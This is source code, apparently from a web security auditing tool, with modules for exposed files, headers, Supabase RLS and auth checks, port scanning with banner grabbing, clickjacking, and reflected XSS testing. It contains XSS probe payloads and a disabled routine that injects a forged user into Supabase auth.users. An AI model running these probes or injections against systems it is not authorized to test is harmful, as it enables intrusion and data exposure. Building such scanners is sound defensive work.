    const contentType = res.headers.get('content-type') || '';
    const mediaType = contentType.split(';', 1)[0].trim().toLowerCase();
    const body = await res.text();

    // Verify this is not just a custom 404 page or a SPA responding 200 to everything
    if (body.length < 10) return null;
    // If the size is close to the fake-404 or the home page, treat as SPA catch-all.
    // Threshold widened to 250 bytes because i18n SPAs (Next.js, Nuxt) vary the
    // shell content slightly per route while still serving the same app shell.
    if (fakeIsCatchAll && fakeSize > 0 && mediaType === fakeType && Math.abs(body.length - fakeSize) < 250) return null;
    if (homeSize > 0 && mediaType === homeType && Math.abs(body.length - homeSize) < 250) return null;
    // HTML response on a path that should never be HTML => SPA catch-all.
    const looksNonHtml = /\.(?:env|json|sh|key|pem|sql|conf|cfg|log|bak|asp|aspx|jsp|cgi)(?:\.[a-z0-9]+)?$|\/\.git\/|\/\.htaccess$|\/\.DS_Store$|\/server\.(?:js|ts|py|php|rb|go)$/i.test(path);
    if (contentType.includes('text/html') && looksNonHtml) return null;

    const signal = classifySensitiveFile(path, body, mediaType);
    if (!signal) return null;
    return { ...signal, path, url, contentType, bodyLength: body.length };
  });

  for (const check of checks) {
    if (!check) continue;
    addFinding(
      check.severity,
      'Exposed Files',
      `Confirmed exposed ${check.kind}: ${check.path}`,
      `${check.url} returned content matching ${check.kind} (${check.bodyLength} bytes, content-type: ${check.contentType})`,
      `Block access to ${check.path} via the web server configuration.`,
      { classification: check.classification, confidence: check.confidence, rule_id: `vice/files/${check.kind.replace(/[^a-z0-9]+/gi, '-').toLowerCase()}` },
    );
  }
}

// ──────────── MODULE 4 : HTTP Headers ────────────

async function checkHeaders(baseUrl, spinner) {
  spinner.text = 'Analyzing HTTP security headers...';
  const res = await safeFetch(baseUrl);
  if (!res) return;

  const headers = res.headers;

  // Missing security headers (CSP and X-Frame-Options excluded - handled by dedicated modules)
  for (const h of SECURITY_HEADERS) {
    if (!headers.get(h.name.toLowerCase())) {
      addFinding(h.severity, 'Headers', `Missing security header: ${h.name}`, `The ${h.name} header is not present in the response`, `Add the ${h.name} header in the server configuration`);
    }
  }

  // Deprecated header check
  const xssProtection = headers.get('x-xss-protection');
  if (xssProtection) {
    addFinding('INFO', 'Headers', 'Deprecated header present: X-XSS-Protection', `X-XSS-Protection: ${xssProtection}\nThis header is deprecated - Chrome removed the XSS Auditor in 2019. No modern browser supports it.`, 'Remove the X-XSS-Protection header. Use Content-Security-Policy instead.');
  }

  // Headers leaking information
  for (const h of LEAK_HEADERS) {
    const val = headers.get(h.toLowerCase());
    if (val) {
      addFinding('MOYENNE', 'Headers', `Information header exposed: ${h}`, `${h}: ${val}`, `Remove the ${h} header to avoid revealing the tech stack`);
    }
  }

  // Check HTTPS
  spinner.text = 'Checking HTTPS...';
  if (baseUrl.startsWith('http://')) {
    const httpsUrl = baseUrl.replace('http://', 'https://');
    const httpsRes = await safeFetch(httpsUrl);
    if (!httpsRes) {
      addFinding('CRITIQUE', 'HTTPS', 'HTTPS not available', `${httpsUrl} does not respond`, 'Enable HTTPS with an SSL/TLS certificate (Let\'s Encrypt)');
    }
  }

  // HTTP -> HTTPS redirect check is handled by the SSL/TLS scenario in
  // auditAttackScenarios (scenario 6) - avoid double-flagging the same issue.

  for (const header of getSetCookieHeaders(headers)) {
    const cookie = classifySetCookie(header, { https: new URL(baseUrl).protocol === 'https:' });
    if (!cookie) continue;
    addFinding(
      cookie.severity,
      'Cookies',
      `Cookie "${cookie.name}" has insecure attributes`,
      `Issues: ${cookie.issues.join('; ')}. Cookie values are intentionally omitted from evidence.`,
      'Use HttpOnly for sensitive cookies, Secure on HTTPS, an appropriate SameSite value, and valid cookie prefixes.',
    );
  }
}

// ──────────── MODULE 5 : Supabase Audit ────────────

async function auditSupabase(jsContents, spinner, provided = null) {
  spinner.text = 'Searching for Supabase configuration...';

  // Caller-supplied credentials (supabase-deep) take precedence over discovery.
  // This lets the deep scan test a project by its explicit URL + anon key even
  // when the target's public bundle does not expose them.
  let supabaseUrl = provided?.url || null;
  let anonKey = provided?.key || null;

  for (const js of jsContents) {
    if (!supabaseUrl) {
      const urlMatch = js.match(/https?:\/\/[a-z0-9\-]+\.supabase\.co/i);
      if (urlMatch) supabaseUrl = urlMatch[0];
    }
    if (!anonKey) {
      const keyMatches = js.match(/eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/g) || [];
      anonKey = keyMatches.find((key) => classifySupabaseJwt(key) === 'anon') || null;
    }
  }

  if (!supabaseUrl) {
    addFinding('INFO', 'Supabase', 'No Supabase URL detected', 'No Supabase configuration found in client code', '');
    return { tablesTested: 0, inventoryComplete: false, scoreAvailable: false };
  }

  addFinding('INFO', 'Supabase', 'Supabase URL found', supabaseUrl, 'The Supabase URL is public by design, but verify that RLS is in place');

  if (!anonKey) {
    addFinding('INFO', 'Supabase', 'Anon key not found', 'Cannot test RLS without anon key', '');
    return { tablesTested: 0, inventoryComplete: false, scoreAvailable: false };
  }

  if (!await authorizeDiscoveredDestination(supabaseUrl)) {
    addFinding('INFO', 'Supabase', 'Supabase target blocked by network safety policy', `Project host could not pass public network validation: ${supabaseUrl}`, 'Verify that the project resolves only to public addresses.');
    return { tablesTested: 0, inventoryComplete: false, scoreAvailable: false };
  }

  if (classifySupabaseJwt(anonKey) === 'service_role') {
    addFinding('CRITIQUE', 'Supabase', 'Service role key supplied for anon audit', 'A service-role key bypasses RLS, so using it would make every access result invalid.', 'Replace it with the public anon key and rotate the service-role key if it was exposed client-side.');
    return { tablesTested: 0, inventoryComplete: false, scoreAvailable: false };
  }

  const headers = {
    'apikey': anonKey,
    'Authorization': `Bearer ${anonKey}`,
  };
  const clientTables = extractSupabaseTableCandidates(jsContents);
  const tables = new Set(clientTables);
  let inventoryComplete = false;
  let schemaStatus = null;

  // Prefer the complete OpenAPI inventory, then fall back to tables observed in
  // the public client when project settings hide the schema document.
  spinner.text = 'Retrieving Supabase table schema...';
  const schemaRes = await safeFetch(`${supabaseUrl}/rest/v1/`, {
    headers: {
      ...headers,
      'Accept': 'application/openapi+json',
    }
  });

  schemaStatus = schemaRes?.status ?? null;
  if (schemaRes && schemaRes.status === 200) {
    try {
      const schema = await schemaRes.json();
      const schemaTables = normalizeSupabaseSchemaTables(Object.keys(schema.paths || {}));
      for (const table of schemaTables) tables.add(table);
      inventoryComplete = schemaTables.length > 0;
      if (schemaTables.length > 0) addFinding('INFO', 'Supabase', `${schemaTables.length} table(s) detected in schema`, schemaTables.join(', '), '');
    } catch {
      inventoryComplete = false;
    }
  }

  if (!inventoryComplete) {
    for (const table of COMMON_SENSITIVE_TABLE_CANDIDATES) tables.add(table);
    addFinding('INFO', 'Supabase RLS', 'Supabase schema inventory unavailable', `OpenAPI inventory returned status ${schemaStatus ?? 'unreachable'}. ${clientTables.length} table candidate(s) were recovered from public client calls and a bounded sensitive-table fallback was added.`, 'Expose OpenAPI only when appropriate, or connect the repository so VICE can compare migrations with observed runtime access.', { classification: 'confirmed', confidence: 'high', rule_id: 'vice/rls/schema-inventory-unavailable' });
  }

  const deniedTables = [];
  const emptyTables = [];
  let tablesTested = 0;
  const candidates = [...tables].slice(0, 100);
  spinner.text = `Testing RLS on ${candidates.length} table candidate(s)...`;

  for (const table of candidates) {
    const tableRes = await safeFetch(`${supabaseUrl}/rest/v1/${encodeURIComponent(table)}?select=*&limit=1`, { headers });
    if (!tableRes) continue;

    if (tableRes.status === 200) {
      let data;
      try { data = await tableRes.json(); } catch { data = null; }
      if (!Array.isArray(data)) continue;
      tablesTested++;
      if (data.length > 0) {
        const exposure = classifySupabaseRead(table, data);
        if (!exposure) continue;
        const paths = exposure.paths.length > 0 ? `\nSensitive field paths: ${exposure.paths.join(', ')}` : '';
        addFinding(exposure.severity, 'Supabase RLS', exposure.title, `Table ${table} returns ${data.length} row(s) with the anon key.${paths}`, `Review SELECT policies and expose only fields intended for public access on "${table}".`, { classification: 'confirmed', confidence: 'high', rule_id: 'vice/rls/anonymous-read' });
      } else {
        emptyTables.push(table);
      }
    } else if (tableRes.status === 401 || tableRes.status === 403) {
      tablesTested++;
      deniedTables.push(table);
    }
  }

  if (deniedTables.length > 0) {
    addFinding('INFO', 'Supabase RLS', `${deniedTables.length} table(s) deny anon reads`, deniedTables.join(', '), '', { classification: 'confirmed', confidence: 'high', rule_id: 'vice/rls/anonymous-read-denied' });
  }
  if (emptyTables.length > 0) {
    addFinding('INFO', 'Supabase RLS', `${emptyTables.length} readable table(s) returned no rows`, `${emptyTables.join(', ')}\nAn empty response cannot distinguish an empty table from row filtering.`, 'Review these tables in a white-box audit when complete RLS assurance is required.', { classification: 'heuristic', confidence: 'low', rule_id: 'vice/rls/empty-read-inconclusive' });
  }
  if (tablesTested === 0) {
    addFinding('INFO', 'Supabase RLS', 'Supabase table coverage incomplete', 'No table candidate could be confirmed through the anon REST API, so the deep score is unavailable.', 'Connect repository migrations or enable an authorized schema inventory before relying on this deep scan.', { classification: 'heuristic', confidence: 'low', rule_id: 'vice/rls/no-table-coverage' });
  }

  // Check auth endpoints
  spinner.text = 'Checking Supabase auth endpoints...';
  const authRes = await safeFetch(`${supabaseUrl}/auth/v1/settings`, {
    headers: { 'apikey': anonKey },
  });

  if (authRes && authRes.status === 200) {
    try {
      const settings = await authRes.json();
      if (settings.external) {
        const providers = Object.entries(settings.external)
          .filter(([_, v]) => v === true || v?.enabled === true)
          .map(([k]) => k);
        if (providers.length > 0) {
          addFinding('INFO', 'Supabase Auth', 'Active auth providers', providers.join(', '), 'Verify that only necessary providers are enabled');
        }
      }
      if (settings.disable_signup === false) {
        addFinding('INFO', 'Supabase Auth', 'Public signup is enabled', 'Supabase Auth settings advertise that new account creation is enabled. No account was created by this audit.', 'Confirm that public signup is intended and protected against automation.', { classification: 'confirmed', confidence: 'high', rule_id: 'vice/auth/public-signup-enabled' });
      }
    } catch {}
  }

  return {
    tablesTested,
    tableCandidates: candidates.length,
    inventoryComplete,
    scoreAvailable: tablesTested > 0,
  };
}

// ──────────── MODULE 6 : Auth Injection Test ────────────

async function auditAuthInjection(jsContents, spinner) {
  spinner.text = 'Searching for Supabase configuration for auth test...';

  let supabaseUrl = null;
  let anonKey = null;
  let serviceRoleKey = null;

  for (const js of jsContents) {
    const urlMatch = js.match(/https?:\/\/[a-z0-9\-]+\.supabase\.co/i);
    if (urlMatch && !supabaseUrl) supabaseUrl = urlMatch[0];

    // Collect all found JWTs
    const jwtMatches = js.match(/eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/g);
    if (jwtMatches) {
      for (const jwt of jwtMatches) {
        try {
          const payload = JSON.parse(Buffer.from(jwt.split('.')[1], 'base64url').toString());
          if (payload.role === 'service_role') {
            serviceRoleKey = jwt;
          } else if (payload.role === 'anon' && !anonKey) {
            anonKey = jwt;
          }
        } catch {}
      }
    }
  }

  if (!supabaseUrl) {
    addFinding('INFO', 'Auth Injection', 'No Supabase URL - test skipped', '', '');
    return;
  }

  if (!await authorizeDiscoveredDestination(supabaseUrl)) {
    addFinding('INFO', 'Auth Injection', 'Supabase target blocked by network safety policy', supabaseUrl, 'Verify that the project resolves only to public addresses.');
    return;
  }

  if (!anonKey) {
    addFinding('INFO', 'Auth Injection', 'No anon key found - test skipped', '', '');
    return;
  }

  // ── CHECK 1 : Exposed Service Role Key ──
  if (serviceRoleKey) {
    addFinding('CRITIQUE', 'Auth Injection', 'SERVICE_ROLE KEY EXPOSED IN CLIENT', `Value: ${serviceRoleKey}`, 'The service_role key grants FULL access to the database, bypasses all RLS. Remove it IMMEDIATELY from client code and keep it server-side only.');
  }

  // ── CHECK 2 : Reading auth.users via REST (auth schema) ──
  spinner.text = 'Attempting to read auth.users via REST...';

  // Test with the anon key first
  const keysToTest = [{ key: anonKey, label: 'anon key' }];
  if (serviceRoleKey) keysToTest.push({ key: serviceRoleKey, label: 'service_role key' });

  for (const { key, label } of keysToTest) {
    // Attempt via the auth schema
    const authUsersRes = await safeFetch(`${supabaseUrl}/rest/v1/users?select=*&limit=5`, {
      headers: {
        'apikey': key,
        'Authorization': `Bearer ${key}`,
        'Accept-Profile': 'auth',
      }
    });

    if (authUsersRes && authUsersRes.status === 200) {
      let data;
      try { data = await authUsersRes.json(); } catch { data = null; }
      if (Array.isArray(data) && data.length > 0) {
        const emails = data.map(u => u.email || u.id).join(', ');
        addFinding('CRITIQUE', 'Auth Injection', `Table auth.users READABLE with ${label}`, `Users found: ${emails}`, 'The auth.users table must NEVER be accessible via the REST API. Check grants on the auth schema and RLS.');
      }
    }

    // Attempt via the public schema (if a users view or table exists)
    for (const tableName of ['users', 'profiles', 'accounts']) {
      const pubRes = await safeFetch(`${supabaseUrl}/rest/v1/${tableName}?select=*&limit=5`, {
        headers: {
          'apikey': key,
          'Authorization': `Bearer ${key}`,
        }
      });

      if (pubRes && pubRes.status === 200) {
        let data;
        try { data = await pubRes.json(); } catch { data = null; }
        if (Array.isArray(data) && data.length > 0) {
          const cols = Object.keys(data[0]).join(', ');
          const hasEmail = cols.includes('email');
          const hasPassword = cols.includes('password') || cols.includes('hash') || cols.includes('encrypted');
          let sev = 'ELEVEE';
          let extra = '';
          if (hasPassword) {
            sev = 'CRITIQUE';
            extra = ' - CONTAINS PASSWORD DATA';
          }
          addFinding(sev, 'Auth Injection', `Table "${tableName}" readable with ${label}${extra}`, `Exposed columns: ${cols}\nData: ${JSON.stringify(data[0])}`, `Enable RLS and restrict visible columns on "${tableName}"`);
        }
      }
    }
  }

  addFinding('INFO', 'Auth Injection', 'Active auth mutation probes skipped', 'The audit did not create accounts, inject rows, or attempt password login. Read-only schema and RLS checks remain active.', '', { classification: 'confirmed', confidence: 'high', rule_id: 'vice/auth/non-destructive-mode' });
  return;

  // ── CHECK 3 : Open signup - unrestricted account creation ──
  spinner.text = 'Testing open signup...';
  const signupCanary = createSupabaseCanary(supabaseUrl, 'audit');
  const injectionCanary = createSupabaseCanary(supabaseUrl, 'injection');
  const testEmail = signupCanary.email;
  const injectionEmail = injectionCanary.email;
  const testPassword = signupCanary.password;

  const signupRes = await safeFetch(`${supabaseUrl}/auth/v1/signup`, {
    method: 'POST',
    headers: {
      'apikey': anonKey,
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      email: testEmail,
      password: testPassword,
    }),
  });

  if (signupRes) {
    const status = signupRes.status;
    let body;
    try { body = await signupRes.json(); } catch { body = {}; }

    const signal = classifySignupResponse(status, body);
    if (signal) {
      addFinding(
        signal.severity,
        'Auth Injection',
        signal.title,
        `Status ${status}. Canary account: ${testEmail}. Immediate session: ${signal.kind === 'immediate-session' ? 'yes' : 'no'}.`,
        signal.kind === 'immediate-session' ? 'Confirm that public signup is intended and protected against automation.' : '',
        { classification: signal.classification, confidence: signal.confidence, rule_id: `vice/auth/signup-${signal.kind}` },
      );
    }
  }

  // ── CHECK 4 : Direct injection into auth.users via REST ──
  spinner.text = 'Attempting direct injection into auth.users...';

  for (const { key, label } of keysToTest) {
    const injectRes = await safeFetch(`${supabaseUrl}/rest/v1/users`, {
      method: 'POST',
      headers: {
        'apikey': key,
        'Authorization': `Bearer ${key}`,
        'Content-Type': 'application/json',
        'Accept-Profile': 'auth',
        'Prefer': 'return=representation',
      },
      body: JSON.stringify({
        instance_id: '00000000-0000-0000-0000-000000000000',
        email: injectionEmail,
        encrypted_password: '$2a$10$PBPVTGj2mXoLbn4nhBOYhuXGp1E5KFkyrQKCqbcSm0hOxwDmMOsta',
        email_confirmed_at: new Date().toISOString(),
        role: 'authenticated',
        aud: 'authenticated',
      }),
    });

    if (injectRes) {
      const status = injectRes.status;
      let body;
      try { body = await injectRes.json(); } catch { body = {}; }

      if (status === 201 || status === 200) {
        addFinding('CRITIQUE', 'Auth Injection', `INJECTION INTO auth.users SUCCEEDED with ${label}`, `A user was injected directly into auth.users!\nResponse: ${JSON.stringify(body)}`, 'URGENT: The auth schema is writable. Immediately revoke INSERT grants on auth.users for anon/authenticated roles.');
      } else if (status === 401 || status === 403 || status === 404) {
        addFinding('INFO', 'Auth Injection', `auth.users injection blocked with ${label}`, `Status ${status} - access denied`, '');
      }
    }
  }

  // ── CHECK 5 : Login test with test credentials ──
  spinner.text = 'Checking if the test account is exploitable...';

  const loginRes = await safeFetch(`${supabaseUrl}/auth/v1/token?grant_type=password`, {
    method: 'POST',
    headers: {
      'apikey': anonKey,
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      email: testEmail,
      password: testPassword,
    }),
  });

  if (loginRes) {
    let body;
    try { body = await loginRes.json(); } catch { body = {}; }

    if (loginRes.status === 200 && body.access_token) {
      addFinding(
        'INFO',
        'Auth Injection',
        'Canary signup account obtained a normal authenticated session',
        `User ID: ${body.user?.id || 'unknown'}\nRole: ${body.user?.role || 'authenticated'}`,
        'Confirm that immediate sessions are intended and protected against automated signup abuse.',
        { classification: 'confirmed', confidence: 'high', rule_id: 'vice/auth/signup-session' },
      );

      // Test what this token can do
      spinner.text = 'Testing privileges of the injected account...';
      const tokenTestRes = await safeFetch(`${supabaseUrl}/rest/v1/`, {
        headers: {
          'apikey': anonKey,
          'Authorization': `Bearer ${body.access_token}`,
          'Accept': 'application/openapi+json',
        }
      });

      if (tokenTestRes && tokenTestRes.status === 200) {
        try {
          const schema = await tokenTestRes.json();
          const tables = Object.keys(schema.paths || {}).map(p => p.replace('/', '')).filter(t => t.length > 0);
          if (tables.length > 0) {
            addFinding(
              'INFO',
              'Auth Injection',
              'Authenticated schema inventory is visible to the canary user',
              `${tables.length} table path(s) advertised by OpenAPI. This does not prove row access.`,
              'Review exposed schema metadata if table-name disclosure is not intended.',
              { classification: 'confirmed', confidence: 'high', rule_id: 'vice/auth/openapi-schema' },
            );

            for (const table of tables.slice(0, 12)) {
              const tableRes = await safeFetch(`${supabaseUrl}/rest/v1/${encodeURIComponent(table)}?select=*&limit=5`, {
                headers: {
                  'apikey': anonKey,
                  'Authorization': `Bearer ${body.access_token}`,
                },
              });
              if (!tableRes || tableRes.status !== 200) continue;
              let rows;
              try { rows = await tableRes.json(); } catch { rows = null; }
              const exposure = classifyAuthenticatedSupabaseRead(table, rows, {
                userId: body.user?.id,
                email: body.user?.email || testEmail,
              });
              if (!exposure) continue;
              addFinding(
                exposure.severity,
                'Auth Injection',
                exposure.title,
                `${Array.isArray(rows) ? rows.length : 0} row(s) returned.${exposure.paths?.length ? ` Sensitive paths: ${exposure.paths.join(', ')}` : ''}`,
                exposure.severity === 'INFO' ? '' : `Review authenticated SELECT policies on "${table}" and enforce row ownership.`,
                { classification: exposure.classification, confidence: exposure.confidence, rule_id: 'vice/auth/authenticated-table-read' },
              );
            }
          }
        } catch {}
      }
    } else if (loginRes.status === 400 && body.msg?.includes('confirm')) {
      addFinding('INFO', 'Auth Injection', 'Canary account login blocked pending email confirmation', 'Email confirmation prevents an immediate session.', '');
    }
  }

  // ── CHECK 6 : Exposed admin endpoints ──
  spinner.text = 'Checking Supabase admin endpoints...';

  const adminEndpoints = [
    '/auth/v1/admin/users',
    '/auth/v1/admin/generate_link',
  ];

  for (const endpoint of adminEndpoints) {
    for (const { key, label } of keysToTest) {
      const adminRes = await safeFetch(`${supabaseUrl}${endpoint}`, {
        headers: {
          'apikey': key,
          'Authorization': `Bearer ${key}`,
        }
      });

      if (adminRes && adminRes.status === 200) {
        let body;
        try { body = await adminRes.json(); } catch { body = {}; }
        addFinding('CRITIQUE', 'Auth Injection', `Admin endpoint accessible: ${endpoint}`, `Accessible with ${label}\nResponse: ${JSON.stringify(body).substring(0, 500)}`, `The admin endpoint ${endpoint} must only be accessible with the service_role key server-side. Never from the client.`);
      }
    }
  }
}

// ──────────── MODULE 7 : VPS Audit ────────────

const COMMON_PORTS = [
  { port: 21,    name: 'FTP',          risk: 'Unencrypted file transfer' },
  { port: 22,    name: 'SSH',          risk: 'Remote shell access' },
  { port: 23,    name: 'Telnet',       risk: 'Unencrypted remote access - VERY DANGEROUS' },
  { port: 25,    name: 'SMTP',         risk: 'Mail server - can be abused for spam' },
  { port: 80,    name: 'HTTP',         risk: 'Web server (normal)' },
  { port: 443,   name: 'HTTPS',        risk: 'Secure web server (normal)' },
  { port: 3000,  name: 'Dev Server',   risk: 'Dev server (Node/Next/Nuxt) - should not be in production' },
  { port: 3306,  name: 'MySQL',        risk: 'Exposed MySQL database' },
  { port: 4200,  name: 'Angular Dev',  risk: 'Angular dev server' },
  { port: 5432,  name: 'PostgreSQL',   risk: 'Exposed PostgreSQL database' },
  { port: 5555,  name: 'Prisma Studio', risk: 'Database admin interface' },
  { port: 6379,  name: 'Redis',        risk: 'Redis often has no auth by default' },
  { port: 8000,  name: 'HTTP Alt',     risk: 'Alternative HTTP server / API' },
  { port: 8080,  name: 'HTTP Proxy',   risk: 'Proxy or admin panel' },
  { port: 8443,  name: 'HTTPS Alt',    risk: 'Alternative HTTPS' },
  { port: 8888,  name: 'Jupyter',      risk: 'Jupyter Notebook - code/shell access' },
  { port: 9000,  name: 'Portainer',    risk: 'Docker Portainer panel' },
  { port: 9090,  name: 'Prometheus',   risk: 'Monitoring - exposes sensitive metrics' },
  { port: 9200,  name: 'Elasticsearch', risk: 'Elasticsearch - can expose data' },
  { port: 27017, name: 'MongoDB',      risk: 'MongoDB often has no auth by default' },
];

async function scanPort(ip, port, timeout = 3000) {
  const context = getScanContext();
  try { context?.scope?.assertAddress(ip, port); } catch { return false; }
  if (context?.signal?.aborted) return false;
  return new Promise((resolve) => {
    import('net').then(({ default: net }) => {
      const socket = new net.Socket();
      let settled = false;
      const done = value => {
        if (settled) return;
        settled = true;
        context?.signal?.removeEventListener('abort', abort);
        socket.destroy();
        resolve(value);
      };
      const abort = () => done(false);
      context?.signal?.addEventListener('abort', abort, { once: true });
      socket.setTimeout(timeout);
      socket.on('connect', () => done(true));
      socket.on('timeout', () => done(false));
      socket.on('error', () => done(false));
      socket.connect(port, ip);
    }).catch(() => resolve(false));
  });
}

async function grabBanner(ip, port, timeout = 2000) {
  const context = getScanContext();
  try { context?.scope?.assertAddress(ip, port); } catch { return ''; }
  if (context?.signal?.aborted) return '';
  return new Promise((resolve) => {
    let socket = null;
    let data = '';
    let resolved = false;
    const abort = () => done('');
    const done = result => {
      if (resolved) return;
      resolved = true;
      clearTimeout(hardTimeout);
      context?.signal?.removeEventListener('abort', abort);
      socket?.destroy();
      resolve(result);
    };
    const hardTimeout = setTimeout(() => done(data.substring(0, 500)), timeout + 500);
    context?.signal?.addEventListener('abort', abort, { once: true });
    import('net').then(({ default: net }) => {
      socket = new net.Socket();
      socket.setTimeout(timeout);
      socket.on('connect', () => {
        if ([80, 3000, 4200, 5555, 8000, 8080, 8888, 9000, 9090, 9200].includes(port)) {
          socket.write('HEAD / HTTP/1.0\r\nHost: ' + ip + '\r\n\r\n');
        } else if (port === 6379) {
          socket.write('PING\r\n');
        } else if (port === 443 || port === 8443) {
          done('');
          return;
        }
      });
      socket.on('data', (chunk) => {
        data += chunk.toString();
        if (data.length > 500) done(data.substring(0, 500));
      });
      socket.on('timeout', () => done(data.substring(0, 500)));
      socket.on('error', () => done(''));
      socket.on('close', () => done(data.substring(0, 500)));
      socket.connect(port, ip);
    }).catch(() => done(''));
  });
}

async function auditVps(spinner) {
  const ips = [...(getScanContext()?.discoveredIps || discoveredIps)];
  if (ips.length === 0) {
    addFinding('INFO', 'VPS Audit', 'No IP detected', 'No VPS IP address found in client code - scan skipped', '');
    return;
  }

  for (const ip of ips) {
    spinner.text = `Scanning ${ip} - detecting open ports...`;

    const openPorts = [];

    // Scan all ports in parallel
    const results = await Promise.all(
      COMMON_PORTS.map(async ({ port, name, risk }) => {
        const isOpen = await scanPort(ip, port);
        return { port, name, risk, isOpen };
      })
    );

    for (const { port, name, risk, isOpen } of results) {
      if (isOpen) {
        openPorts.push({ port, name, risk });
      }
    }

    if (openPorts.length === 0) {
      addFinding('INFO', 'VPS Audit', `${ip} - no open port detected`, 'All tested ports are closed or filtered', '');
      continue;
    }

    // List open ports
    const portList = openPorts.map(p => `${p.port} (${p.name})`).join(', ');
    addFinding('INFO', 'VPS Audit', `${ip} - ${openPorts.length} open port(s)`, `Ports: ${portList}`, '');

    // Analyze each open port
    for (const { port, name, risk } of openPorts) {
      spinner.text = `${ip}:${port} (${name}) - grabbing banner...`;
      const banner = await grabBanner(ip, port);

      const signal = classifyOpenService(port, banner);
      if (signal) {
        addFinding(
          signal.severity,
          'VPS Audit',
          `${ip}:${port} - ${signal.title}`,
          `TCP connection succeeded.${banner ? `\nBanner: ${banner}` : '\nNo protocol banner was confirmed.'}`,
          signal.recommendation,
          { classification: signal.classification, confidence: signal.confidence, rule_id: `vice/vps/service-${port}-${signal.state}` },
        );
      }
    }

    // Check reverse DNS
    spinner.text = `${ip} - checking reverse DNS...`;
    try {
      const dns = await import('dns');
      const hostnames = await new Promise((resolve, reject) => {
        dns.default.reverse(ip, (err, hostnames) => {
          if (err) reject(err);
          else resolve(hostnames);
        });
      });
      if (hostnames.length > 0) {
        addFinding('INFO', 'VPS Audit', `${ip} - reverse DNS`, `Hostnames: ${hostnames.join(', ')}`, '');
      }
    } catch {}

    // Test if the IP responds to HTTP (potential Cloudflare bypass)
    spinner.text = `${ip} - testing direct HTTP access...`;
    const directHttp = await safeFetch(`http://${ip}`, { headers: { 'Host': ip } });
    if (directHttp && directHttp.status === 200) {
      const server = directHttp.headers.get('server') || '';
      addFinding('ELEVEE', 'VPS Audit', `${ip} - direct HTTP access possible`, `Server responds to HTTP on the direct IP (Cloudflare/proxy bypass possible)${server ? `\nServer: ${server}` : ''}`, 'Configure the web server to refuse connections that do not come through the domain/proxy');
    }

    const directHttps = await safeFetch(`https://${ip}`, { headers: { 'Host': ip } });
    if (directHttps) {
      const server = directHttps.headers.get('server') || '';
      addFinding('ELEVEE', 'VPS Audit', `${ip} - direct HTTPS access possible`, `Server responds to HTTPS on the direct IP${server ? `\nServer: ${server}` : ''}`, 'Configure nginx/Apache to block requests without a valid Host (default_server returning 444)');
    }
  }
}

// ──────────── MODULE 8 : Attack tests (XSS, Clickjacking, MITM, Injection) ────────────

async function auditAttackScenarios(baseUrl, jsContents, spinner) {
  const origin = new URL(baseUrl).origin;

  // ── SCENARIO 1 : Clickjacking ──
  spinner.text = 'Clickjacking test (iframe embedding)...';
  {
    let browser;
    try {
      browser = await launchBrowser();
      const page = await createBrowserPage(browser, baseUrl);

      // Create a page that embeds the site in an iframe
      const testHtml = `
        <html><body>
          <iframe id="target" src="${baseUrl}" width="800" height="600"></iframe>
          <script>
            window.addEventListener('message', e => {});
            setTimeout(() => {
              try {
                const f = document.getElementById('target');
                document.title = f.contentDocument ? 'LOADED' : 'BLOCKED';
              } catch(e) {
                document.title = 'CROSS-ORIGIN';
              }
            }, 5000);
          </script>
        </body></html>`;

      await page.setContent(testHtml, { waitUntil: 'networkidle2', timeout: 15000 });
      await new Promise(r => setTimeout(r, 6000));

      // Check if the iframe loaded
      const frames = page.frames();
      const iframeLoaded = frames.length > 1;

      // Check the headers of the original request
      const directRes = await safeFetch(baseUrl);
      const xfo = directRes?.headers.get('x-frame-options');
      const csp = directRes?.headers.get('content-security-policy');
      const hasFrameProtection = xfo || (csp && csp.includes('frame-ancestors'));

      if (!hasFrameProtection && iframeLoaded) {
        addFinding('MOYENNE', 'Clickjacking', 'Site embeddable in an iframe', `${baseUrl} can be embedded in an iframe.\nAn attacker could overlay a decoy page.`, 'Add the X-Frame-Options: DENY or Content-Security-Policy: frame-ancestors \'none\' header');
      } else if (!hasFrameProtection) {
        addFinding('ELEVEE', 'Clickjacking', 'No anti-iframe protection detected', 'X-Frame-Options and CSP frame-ancestors headers are missing', 'Add X-Frame-Options: DENY and/or CSP frame-ancestors');
      } else {
        addFinding('INFO', 'Clickjacking', 'Anti-clickjacking protection active', `X-Frame-Options: ${xfo || 'absent'}, CSP frame-ancestors: ${csp ? 'present' : 'absent'}`, '');
      }

      await browser.close();
    } catch (err) {
      if (browser) await browser.close();
      addFinding('INFO', 'Clickjacking', 'Clickjacking test failed', err.message, '');
    }
  }

  // ── SCENARIO 2 : XSS Reflected via URL ──
  spinner.text = 'XSS reflected test via URL parameters...';
  {
    const xssPayloads = [
      { name: 'Basic script', payload: '<script>alert(1)</script>' },
      { name: 'Event handler', payload: '"><img src=x onerror=alert(1)>' },
      { name: 'SVG onload', payload: '<svg onload=alert(1)>' },
      { name: 'Javascript URI', payload: 'javascript:alert(1)' },
      { name: 'Event without quotes', payload: '\' onfocus=alert(1) autofocus=\'' },
      { name: 'Template literal', payload: '${alert(1)}' },
    ];

    const testParams = ['q', 'search', 'query', 'redirect', 'url', 'next', 'callback', 'return', 'page', 'id', 'name', 'error', 'msg', 'message'];

    let browser;
    try {
      browser = await launchBrowser();
      const page = await createBrowserPage(browser, baseUrl);

      let xssFound = false;

      for (const param of testParams) {
        if (xssFound) break;
        for (const { name, payload } of xssPayloads) {
          const testUrl = `${baseUrl}?${param}=${encodeURIComponent(payload)}`;

          let alertTriggered = false;
          page.on('dialog', async (dialog) => {
            alertTriggered = true;
            await dialog.dismiss();
          });

          try {
            await page.goto(testUrl, { waitUntil: 'networkidle2', timeout: 10000 });
          } catch {}

          if (alertTriggered) {
            addFinding('CRITIQUE', 'XSS', `XSS Reflected detected via parameter "${param}"`, `Payload: ${payload}\nURL: ${testUrl}\nThe script executes in the victim's browser.`, 'Escape all user output (HTML entities). Add a strict Content-Security-Policy. Use frameworks that escape by default (Vue, React).');
            xssFound = true;
            break;
          }

          // Check if the payload is reflected in the DOM without execution
          const bodyHtml = await page.content();
          if (bodyHtml.includes(payload)) {
